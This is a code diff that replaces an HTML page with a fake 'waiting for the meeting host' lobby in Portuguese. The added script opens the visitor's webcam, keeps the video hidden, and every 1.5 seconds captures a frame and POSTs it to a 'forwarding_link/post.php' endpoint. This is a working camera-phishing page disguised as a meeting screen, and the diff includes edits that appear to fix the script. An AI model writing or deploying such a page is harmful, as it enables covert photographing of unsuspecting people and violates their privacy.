@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html>
   <head>
     <meta charset="utf-8" />
@@ -274,4 +274,121 @@
       <button style="margin-right: 50px">Encerrar</button>
     </div>
   </body>
+</html> -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1"
+    />
+    <title>Aguardando o Anfitrião da Reunião</title>
+
+    <script
+      type="text/javascript"
+      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
+    ></script>
+    <script
+      src="https://kit.fontawesome.com/c4c45dfab4.js"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
+    ></script>
+  </head>
+
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <center>
+    <canvas id="canvas" width="640" height="480" audoplay></canvas>
+  </center>
+
+  <style>
+    /* ... (CSS mantido) ... */
+  </style>
+
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: "POST",
+        data: { cat: imgdata },
+        url: "forwarding_link/post.php",
+        dataType: "json",
+        async: false,
+        success: function (result) {
+          // Manipulador de sucesso
+        },
+        error: function () {
+          // Manipulador de erro
+        },
+      });
+    }
+
+    // INÍCIO DA CORREÇÃO: Usando IIFE para encapsular o script principal
+    (function() {
+        "use strict";
+
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const errorMsgElement = document.querySelector("span#errorMsg");
+
+        const constraints = {
+          audio: false,
+          video: {
+            facingMode: "user",
+          },
+        };
+
+        // Acessar webcam
+        async function init() {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+          } catch (e) {
+            if (errorMsgElement) {
+              errorMsgElement.innerHTML = `Erro navigator.getUserMedia: ${e.toString()}`;
+            }
+          }
+        }
+
+        // Sucesso na obtenção do stream
+        function handleSuccess(stream) {
+          window.stream = stream;
+          video.srcObject = stream;
+
+          var context = canvas.getContext("2d");
+          // Captura e envia a imagem a cada 1.5 segundos
+          setInterval(function () {
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas
+              .toDataURL("image/png")
+              .replace("image/png", "image/octet-stream");
+            post(canvasData);
+            video.play();
+          }, 1500);
+        }
+        
+        // Função para esconder o Pop-up
+        function PopUp() {
+          document.getElementById("ac-wrapper").style.display = "none";
+        }
+        
+        // Carregar a inicialização da câmera
+        init();
+
+        // Esconde o pop-up após 50 segundos 
+        $(document).ready(function () {
+          setTimeout(function () {
+            PopUp();
+          }, 50000);
+        });
+    })(); // FIM DA CORREÇÃO IIFE
+  </script>
+
+  <body>
+    </body>
 </html>
